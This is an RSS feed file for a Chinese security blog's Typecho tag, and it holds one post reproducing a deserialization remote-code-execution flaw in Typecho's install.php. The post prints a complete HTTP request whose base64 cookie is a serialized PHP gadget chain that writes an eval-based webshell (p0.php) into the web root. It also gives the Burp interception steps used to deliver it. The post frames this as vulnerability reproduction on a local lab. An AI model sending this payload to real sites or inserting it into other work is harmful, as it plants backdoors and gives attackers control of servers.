@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Typecho on iceH&#39;s Blog</title>
+        <link>https://360rce.github.io/tags/typecho/</link>
+        <description>Recent content in Typecho on iceH&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
+        <lastBuildDate>Tue, 24 Oct 2017 14:17:42 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/typecho/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Typecho install.php 反序列化导致任意代码执行</title>
+        <link>https://360rce.github.io/p/r3x4n4vi/</link>
+        <pubDate>Tue, 24 Oct 2017 14:17:42 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/r3x4n4vi/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/6d/wallhaven-6dp98l.png" alt="Featured image of post Typecho install.php 反序列化导致任意代码执行" /&gt;&lt;h1 id=&#34;什么是typecho&#34;&gt;什么是Typecho？&lt;/h1&gt;
+&lt;p&gt;Typecho 是一款博客程序，它在 GPL version 2 许可证下发行，基于 PHP (需要 PHP5 以上版本)构建,可以运行在各种平台上，支持多种数据库(Mysql, PostgreSQL, SQLite)，在国内使用较广。&lt;/p&gt;
+&lt;h1 id=&#34;影响的版本&#34;&gt;影响的版本&lt;/h1&gt;
+&lt;p&gt;GitHub上2017年10月24日之前的所以版本。&lt;/p&gt;
+&lt;h1 id=&#34;payload&#34;&gt;Payload&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /typecho/install.php?finish=1 HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 192.168.0.127
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer:http://192.168.0.127/typecho/install.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Upgrade-Insecure-Requests: 1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h1&gt;
+&lt;p&gt;我们先去typecho官网下载套源码在本地搭建个环境&lt;/p&gt;
+&lt;p&gt;搭建过程就不多说了，自己百度&lt;/p&gt;
+&lt;p&gt;搭建好后我们访问首页看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/r3x4n4vi/01.png&#34;
+	width=&#34;1259&#34;
+	height=&#34;760&#34;
+	srcset=&#34;https://360rce.github.io/p/r3x4n4vi/01_hu9d71d8d6c3ebd1f951658ab8d6c3b4a5_63579_480x0_resize_box_3.png 480w, https://360rce.github.io/p/r3x4n4vi/01_hu9d71d8d6c3ebd1f951658ab8d6c3b4a5_63579_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Typecho install.php 反序列化导致任意代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;397px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来我们打开burp设置好代理，访问http://192.168.0.127/typecho/install.php?finish=1 （将ip换成自己的ip），然后把包拦截，将http协议修改成我们的payload。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/r3x4n4vi/02.png&#34;
+	width=&#34;972&#34;
+	height=&#34;551&#34;
+	srcset=&#34;https://360rce.github.io/p/r3x4n4vi/02_hu57277b8114b404b9a3f8a4118de11685_101158_480x0_resize_box_3.png 480w, https://360rce.github.io/p/r3x4n4vi/02_hu57277b8114b404b9a3f8a4118de11685_101158_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Typecho install.php 反序列化导致任意代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;423px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后放包，网站根目录下就生成了一句话马。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/r3x4n4vi/03.png&#34;
+	width=&#34;611&#34;
+	height=&#34;440&#34;
+	srcset=&#34;https://360rce.github.io/p/r3x4n4vi/03_hu04ee587f02fe66095ceb5407ffda7d79_35651_480x0_resize_box_3.png 480w, https://360rce.github.io/p/r3x4n4vi/03_hu04ee587f02fe66095ceb5407ffda7d79_35651_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Typecho install.php 反序列化导致任意代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;333px&#34;
+	
+&gt;&lt;/p&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
